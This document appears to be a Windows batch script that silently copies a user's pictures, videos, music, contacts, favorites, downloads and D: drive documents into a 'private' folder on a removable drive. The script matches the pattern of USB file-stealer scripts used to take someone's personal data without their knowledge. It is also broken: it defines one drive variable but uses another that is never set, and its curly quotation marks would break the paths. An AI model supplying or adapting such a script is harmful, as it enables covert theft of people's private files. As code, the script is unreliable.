@echo on
:: variables
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo on

%backupcmd% “%USERPROFILE%\Desktop\*.avi” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\Favorites” “%drive%\private\favorites”
%backupcmd% “%USERPROFILE%\Desktop\*.jpg” “%drive%\private\img”
%backupcmd% “%USERPROFILE%\Desktop\*.jpeg” “%drive%\private\img”
%backupcmd% “%USERPROFILE%\Desktop\*.bmp” “%drive%\private\img”
%backupcmd% “%USERPROFILE%\Desktop\*.3gp” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\Desktop\*.mp4” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\Desktop\*.wmv” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\Contacts” “%drive%\private\contacts”
%backupcmd% “%USERPROFILE%\Links” “%drive%\private\links”
%backupcmd% “%USERPROFILE%\My Documents\My Music” “%drive%\private\mp3”
%backupcmd% “%USERPROFILE%\My Documents\Downloads” “%drive%\private\downloads”
%backupcmd% “%USERPROFILE%\My Music” “%drive%\private\mp3”
%backupcmd% “%USERPROFILE%\My Documents\*.jpg” “%drive%\private\img”
%backupcmd% “%USERPROFILE%\My Documents\*.bmp” “%drive%\private\img”
%backupcmd% “%USERPROFILE%\My Documents\*.avi” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\My Documents\*.mpg” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\My Documents\*.3gp” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\My Documents\*.mp4” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\My Pictures” “%drive%\private\img”
%backupcmd% “%USERPROFILE%\Videos” “%drive%\private\vid”
%backupcmd% “%USERPROFILE%\Music” “%drive%\private\mp3”
%backupcmd% “%USERPROFILE%\Downloads” “%drive%\private\downloads”
%backupcmd% “D:\*.jpg” “%drive%\private\img”
%backupcmd% “D:\*.jpeg” “%drive%\private\img”
%backupcmd% “D:\*.bmp” “%drive%\private\img”
%backupcmd% “D:\*.3gp” “%drive%\private\vid”
%backupcmd% “D:\*.mp4” “%drive%\private\vid”
%backupcmd% “D:\*.avi” “%drive%\private\vid”
%backupcmd% “D:\*.wmv” “%drive%\private\vid”
%backupcmd% “D:\*.doc” “%drive%\private\documents”
%backupcmd% “D:\*.pdf” “%drive%\private\documents”
@echo on
cls